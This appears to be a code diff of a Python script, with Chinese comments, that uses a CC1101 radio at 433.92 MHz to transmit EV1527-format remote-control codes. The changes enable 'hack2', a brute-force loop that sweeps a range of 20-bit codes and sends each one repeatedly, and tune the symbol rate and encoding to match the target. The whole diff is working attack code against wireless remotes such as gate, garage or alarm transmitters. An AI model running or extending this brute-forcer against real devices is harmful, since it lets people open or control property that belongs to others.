@@ -43,7 +43,7 @@ def to_code(c):
 
 def hex2code1527(hex_str):
     buf1527 = bytearray()
-    buf1527 += bytes([0x80, 0x00, 0x00, 0x00])  # 起始标记
+    # buf1527 += bytes([0x80, 0x00, 0x00, 0x00])  # 起始标记
     for char in hex_str:
         d = int(char, 16)
         buf1527.append(to_code((d & 0xC) >> 2))
@@ -118,18 +118,24 @@ def hack1(transceiver):
 def test2(transceiver):
     hex_string = '4bb108'
     tx_data = hex2code1527(hex_string)
-    send_data(transceiver, tx_data)
+    for _ in range(2):
+        send_data(transceiver, tx_data)
 
 def hack2(transceiver):
-    start = 0x00000
-    end = 0x40000
+    # start = 0x00000
+    # end = 0x40000
+
+    start = 0x40000
+    end = 0x50000  # 假设新版本的范围更大
+
     for i in range(start, end):
         hex_string = f"{i:05x}" + "1"
         if hex_string == '4bb101':
             continue
         tx_data = hex2code1527(hex_string)
         print(f"Sending: {hex_string}")
-        send_data(transceiver, tx_data)
+        for _ in range(3):
+            send_data(transceiver, tx_data)
 
 # 主程序封装
 def main1():
@@ -145,10 +151,10 @@ def main1():
 def main2():
     logging.basicConfig(level=logging.INFO)
     logging.getLogger("cc1101").setLevel(logging.WARNING)
-    transceiver = init_transceiver(frequency=433.92e6, symbol_rate=2500, power=(0, 0xC0))  # 假设新版本更低的symbol_rate
+    transceiver = init_transceiver(frequency=433.92e6, symbol_rate=2700, power=(0, 0xC0))  # 假设新版本更低的symbol_rate
     try:
-        test2(transceiver)
-        # hack2(transceiver)
+        # test2(transceiver)
+        hack2(transceiver)
     finally:
         close_transceiver(transceiver)
 
